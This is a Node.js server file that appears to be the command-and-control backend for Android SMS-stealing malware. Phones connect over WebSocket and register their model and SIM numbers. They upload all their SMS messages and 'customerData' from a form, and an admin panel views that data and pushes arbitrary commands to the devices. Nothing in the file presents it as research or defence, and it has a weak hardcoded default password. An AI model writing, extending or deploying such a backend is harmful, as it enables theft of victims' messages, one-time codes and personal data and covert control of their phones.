require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

const MONGO_URI = process.env.MONGO_URI || '';
if (!MONGO_URI) { console.error('MONGO_URI missing'); process.exit(1); }
mongoose.set('bufferCommands', false);
mongoose.connect(MONGO_URI, {
  serverSelectionTimeoutMS: 5000,
  connectTimeoutMS: 10000,
  socketTimeoutMS: 45000,
  maxPoolSize: 10,
  writeConcern: { w: 1 }
}).then(() => {
  dbConnected = true;
  console.log('MongoDB connected');
}).catch(err => {
  dbConnected = false;
  console.error('Mongo connect error', err);
});

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: Number,
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: Boolean,
  registrationTimestamp: Date,
  customerData: mongoose.Schema.Types.Mixed,
  isDeleted: Boolean,
  smsMessages: Array
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);

let dbConnected = false;
const inMemoryDevices = [];

function clone(obj) { return obj ? JSON.parse(JSON.stringify(obj)) : obj; }

async function getDevicesFromStore() {
  if (dbConnected) return await Device.find({ isDeleted: { $ne: true } }).lean();
  return inMemoryDevices.filter(d => !d.isDeleted).map(clone);
}

async function findOneInStore(query) {
  if (dbConnected) return await Device.findOne(query).lean();
  if (query.$or) {
    const found = inMemoryDevices.find(d => query.$or.some(q => {
      const k = Object.keys(q)[0];
      return d[k] === q[k];
    }));
    return clone(found || null);
  }
  const keys = Object.keys(query);
  const found = inMemoryDevices.find(d => keys.every(k => d[k] === query[k]));
  return clone(found || null);
}

async function findOneAndUpdateInStore(query, update, opts) {
  if (dbConnected) return await Device.findOneAndUpdate(query, update, opts);
  let item = null;
  if (query.$or && Array.isArray(query.$or)) {
    for (const q of query.$or) {
      const k = Object.keys(q)[0];
      const v = q[k];
      item = inMemoryDevices.find(d => d[k] === v);
      if (item) break;
    }
  } else {
    const k = Object.keys(query)[0];
    const v = query[k];
    item = inMemoryDevices.find(d => d[k] === v);
  }

  if (!item) {
    if (!(opts && opts.upsert)) return null;
    const newItem = {};
    if (query.deviceId) newItem.deviceId = query.deviceId;
    if (update && update.$setOnInsert) Object.assign(newItem, clone(update.$setOnInsert));
    if (update && update.$set) Object.assign(newItem, clone(update.$set));
    inMemoryDevices.push(newItem);
    return clone(newItem);
  }

  if (update && update.$set) Object.assign(item, clone(update.$set));
  if (update && update.$pull && update.$pull.smsMessages) {
      const p = update.$pull.smsMessages;
      if (item.smsMessages) {
          item.smsMessages = item.smsMessages.filter(m => !(m.body === p.body && (m.date === p.date || m.time === p.date)));
      }
  }
  return clone(item);
}

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map();

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (username === 'admin' && password === adminPassword) return res.json({ success: true });
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

app.post('/api/change-password', (req, res) => {
  const { oldPassword, newPassword } = req.body || {};
  if (!oldPassword || !newPassword) return res.status(400).json({ success: false, message: 'Missing fields' });
  if (oldPassword !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong Old Password' });
  adminPassword = newPassword;
  return res.json({ success: true });
});

app.get('/api/devices', async (req, res) => {
  try {
    const list = await getDevicesFromStore();
    const now = Date.now();
    list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
    res.json(list);
  } catch (err) { res.status(500).json({ error: 'Failed' }); }
});

app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });

    let deletedCount = 0;
    if (dbConnected) {
      // Hard delete from MongoDB
      const orQuery = [{ deviceId: deviceId }, { serialNumber: deviceId }];
      if (mongoose.Types.ObjectId.isValid(deviceId)) {
        orQuery.push({ _id: deviceId });
      }
      const r = await Device.deleteMany({ $or: orQuery });
      deletedCount = r.deletedCount;
    } else {
      // Hard delete from Memory
      const before = inMemoryDevices.length;
      for (let i = inMemoryDevices.length - 1; i >= 0; i--) {
        if (inMemoryDevices[i].deviceId === deviceId || inMemoryDevices[i].serialNumber === deviceId) {
          inMemoryDevices.splice(i, 1);
        }
      }
      deletedCount = before - inMemoryDevices.length;
    }

    if (deletedCount === 0) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    io.emit('dashboard-update');
    return res.json({ success: true, message: 'Device and all data deleted' });
  } catch (err) { 
    console.error('Delete error:', err);
    return res.status(500).json({ success: false, message: 'Server error' }); 
  }
});

app.post('/api/delete-sms', async (req, res) => {
  try {
    const { deviceId, smsData } = req.body || {};
    if (!deviceId || !smsData) return res.status(400).json({ success: false, message: 'Missing fields' });
    await findOneAndUpdateInStore({ $or: [{ deviceId }, { serialNumber: deviceId }] }, { $pull: { smsMessages: { body: smsData.body, date: smsData.date } } });
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (err) { return res.status(500).json({ success: false }); }
});

app.post('/api/pin-device', async (req, res) => {
  try {
    const { deviceId, status } = req.body || {};
    if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
    const d = await findOneAndUpdateInStore({ $or: [{ deviceId }, { serialNumber: deviceId }] }, { $set: { isPinned: !!status } }, { returnDocument: 'after' });
    if (!d) return res.status(404).json({ success: false, message: 'Device not found' });
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (e) { return res.status(500).json({ success: false }); }
});

app.post('/api/command', async (req, res) => {
  try {
    const { deviceId, action, data } = req.body || {};
    if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing deviceId or action' });
    let device = await findOneInStore({ $or: [{ deviceId }, { serialNumber: deviceId }] });
    const clients = global.deviceSockets.get(deviceId);

    if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
      const isOnline = clients && clients.size > 0;
      if (isOnline) {
        clients.forEach((client) => {
          try { if (client.readyState === WebSocket.OPEN) client.send(JSON.stringify({ command: action, data: {} })); } catch (e) {}
        });
      }
      if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
      const responseData = { success: true, isOnline };
      if (action === 'VIEW_SMS') {
        let messages = device.smsMessages || [];
        messages = messages.slice().sort((a, b) => (b.date || b.time || 0) - (a.date || a.time || 0));
        responseData.messages = messages;
      }
      if (action === 'VIEW_FORM') responseData.customerData = device.customerData || {};
      if (action === 'VIEW_DATA') responseData.device = device;
      return res.json(responseData);
    }

    if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device not connected' });
    let sentCount = 0;
    clients.forEach((client) => {
      try {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({ command: action, data }));
          sentCount++;
        }
      } catch (e) {}
    });
    if (sentCount === 0) return res.json({ success: false, message: 'Device not connected' });
    return res.json({ success: true, message: 'Command sent' });
  } catch (err) { return res.status(500).json({ success: false, message: err.message }); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

server.on('upgrade', (req, socket, head) => {
  if (req.url && req.url.startsWith('/socket.io')) return;
  wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); });
});

wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', () => ws.isAlive = true);
  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);
      if (data.deviceId || data.serialNumber) {
        const id = data.deviceId || data.serialNumber;
        ws.deviceId = id;
        if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
        global.deviceSockets.get(id).add(ws);
        const update = { $set: { deviceId: id, isOnline: true, lastSeen: new Date() } };
        if (data.model) update.$set.model = data.model;
        if (data.androidVersion) update.$set.androidVersion = data.androidVersion;
        if (data.sim1) update.$set.sim1 = data.sim1;
        if (data.sim2) update.$set.sim2 = data.sim2;
        if (data.battery !== undefined) update.$set.battery = Number(data.battery) || 0;
        if (data.serialNumber) update.$set.serialNumber = data.serialNumber;
        await findOneAndUpdateInStore({ $or: [{ deviceId: id }, { serialNumber: id }] }, { ...update, $setOnInsert: { registrationTimestamp: new Date() } }, { upsert: true });
        io.emit('dashboard-update');
      }
      if (data.type === 'SMS_LIST' && data.deviceId && Array.isArray(data.messages)) {
        await findOneAndUpdateInStore({ $or: [{ deviceId: data.deviceId }, { serialNumber: data.deviceId }] }, { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } });
        io.emit('dashboard-update');
      }
      if (data.type === 'FORM_SUBMIT' && data.deviceId && data.customerData) {
        await findOneAndUpdateInStore({ $or: [{ deviceId: data.deviceId }, { serialNumber: data.deviceId }] }, { $set: { customerData: data.customerData, lastSeen: new Date() } });
        io.emit('dashboard-update');
      }
      if (data.type === 'COMMAND_RESULT' && data.deviceId) {
        io.emit('command-result', data);
      }
    } catch (e) {}
  });
  ws.on('close', () => {
    if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
      const set = global.deviceSockets.get(ws.deviceId);
      set.delete(ws);
      if (set.size === 0) global.deviceSockets.delete(ws.deviceId);
    }
  });
});

const heartbeat = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    try { ws.ping(); } catch (e) {}
  });
}, 20000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('Server listening on', PORT));
